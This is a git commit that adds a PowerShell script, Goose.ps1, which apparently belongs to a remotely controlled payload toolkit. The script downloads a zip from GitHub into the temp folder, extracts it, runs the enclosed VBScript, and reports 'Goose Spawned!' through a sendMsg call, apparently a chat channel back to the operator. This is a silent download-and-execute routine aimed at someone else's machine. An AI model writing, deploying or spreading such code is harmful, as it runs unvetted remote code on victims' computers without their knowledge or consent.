f7febc820c9e42af052db0181be0b2b2cbc1ca69
ertvg <simjkl@hotmail.fr>
2025-01-26 22:51:59 +0100

    Add files via upload

---
+++ Goose.ps1
@@ -0,0 +1,11 @@
+Function Goose {
+    $url = "https://github.com/ertvg/h/blob/main/Goose.zip"
+    $tempFolder = $env:TMP
+    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
+    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
+    Invoke-WebRequest -Uri $url -OutFile $zipFile
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath
+    $vbscript = "$extractPath\Goose.vbs"
+    & $vbscript
+    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
+}
